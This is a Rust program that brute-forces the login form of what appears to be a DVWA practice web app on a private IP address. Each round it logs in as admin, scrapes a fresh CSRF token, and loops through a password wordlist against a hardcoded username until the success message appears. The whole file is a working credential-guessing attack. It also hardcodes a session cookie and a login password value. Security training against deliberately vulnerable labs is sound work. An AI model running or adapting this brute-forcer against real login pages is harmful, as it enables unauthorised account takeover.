use reqwest::header::{COOKIE, HeaderMap, HeaderValue};
use std::convert::Infallible;
use std::time::Duration;
use std::{
    error::Error,
    fs::File,
    io::Read,
    sync::{Arc, Mutex},
};
use tokio::task;

const URL: &'static str = "http://10.164.2.70/vulnerabilities/brute/";
const PHPSESSID: &'static str = "vvcu6frrcr0v2mbuu1hdrulrpr"; // Replace with your actual PHPSESSID
const USERNAME: &'static str = "gvanarendonk";
const THREADS: usize = 1;

fn read_passwords(filename: &'static str) -> Vec<String> {
    let file = File::open(filename).unwrap();
    let mut buf_reader = std::io::BufReader::new(file);
    let mut contents = String::new();
    buf_reader.read_to_string(&mut contents).unwrap();
    contents
        .lines()
        .map(|line| line.to_string().to_lowercase())
        .filter(|line| line.chars().all(|c| c.is_alphabetic()))
        .collect()
}

fn extract_phpsessid(response: &reqwest::Response) -> String {
    let cookies = response.headers().get_all(reqwest::header::SET_COOKIE);
    let mut phpsessid = None;
    for cookie in cookies {
        if let Ok(cookie_str) = cookie.to_str() {
            if let Some(value) = cookie_str.split(';').find_map(|s| {
                let s = s.trim_start();
                if s.starts_with("PHPSESSID=") {
                    s.split('=').nth(1).map(|v| v.to_string())
                } else {
                    None
                }
            }) {
                phpsessid = Some(value);
                break;
            }
        }
    }
    phpsessid.expect("No php session id in response")
}

async fn try_password(
    client: &reqwest::Client,
    password: String,
    index: usize
)-> Result<(), Box<dyn Error + Send + Sync>> {
    let mut user_token = String::new();
    let mut phpsessid = String::new();
    while user_token.is_empty() {
        let login_page_response = client.get("http://10.164.2.70/login.php").send().await?;

        phpsessid = extract_phpsessid(&login_page_response);

        let login_page_text = login_page_response.text().await?;
        let document = scraper::Html::parse_document(&login_page_text);
        let selector = scraper::Selector::parse(r#"input[name="user_token"]"#).unwrap();
        let input_element = document.select(&selector).next();
        if let Some(input_element) = input_element {
            user_token = input_element.value().attr("value").expect("No value attribute in user_token input field").to_string();
        };
    }
    let mut headers = HeaderMap::new();
    headers.insert(
        COOKIE,
        HeaderValue::from_str(&format!("PHPSESSID={}; security=medium", phpsessid))?,
    );

    let response = client.post("http://10.164.2.70/login.php")
        .headers(headers)
        .form(&[
            ("username", "admin"),
            ("password", "@hotmail.com"),
            ("Login", "Login"),
            ("user_token", &user_token)
        ])
        .send().await?;

    // let phpsessid = extract_phpsessid(&response);

    // Create headers with PHPSESSID cookie
    let mut headers = HeaderMap::new();
    // Combine both cookies into a single header value
    headers.insert(
        COOKIE,
        HeaderValue::from_str(&format!("PHPSESSID={}; security=medium", phpsessid))?,
    );

    // Make the request
    let payload = format!(
        "{}?username={}&password={}&Login=Login#",
        URL, USERNAME, password
    );

    let client_clone = client.clone();
    let password = password.clone();
    // NOTE: This part causes a timeout, which is why we do this on an asynchronous
    // thread
    tokio::spawn(async move {
        loop {
            let response = client_clone
                .get(&payload)
                .headers(headers.clone())
                .send().await?;

            let response_text = response.text().await?;

            // println!("Handled: {} => {}", index, response_text);

            // Check if login was successful
            if response_text.contains("Welcome to the password protected area") {
                println!("Found password: {}", password);
                std::process::exit(0);
            }
            else if response_text.contains("Username and/or password incorrect.") {
                println!("no password found for: {}", index);
                return Ok::<Option<String>, Box<dyn Error + Send + Sync>>(None);
            } else {
                // println!("fucked up, retrying...");
                tokio::time::sleep(Duration::from_millis(100)).await;
            }
        }
    });
    Ok(())
}

#[tokio::main]
pub async fn run() -> Result<(), Box<dyn Error>> {
    let passwords = read_passwords("passwords/other.txt");
    let total_passwords = passwords.len();

    println!(
        "Starting brute force with {} passwords",
        total_passwords
    );

    // Split passwords into chunks for each thread
    let client = reqwest::Client::builder()
        .pool_idle_timeout(std::time::Duration::from_secs(30))
        .build()?;
    for (index, password) in passwords.into_iter().enumerate() {
        loop {
            match try_password(
                &client,
                password.clone(),
                index,
            ).await {
                Err(e) => {
                    println!("Failed with error {:?}... retrying now", e);
                    continue;
                },
                _ => break,
            }
        }
    }

    Ok(())
}
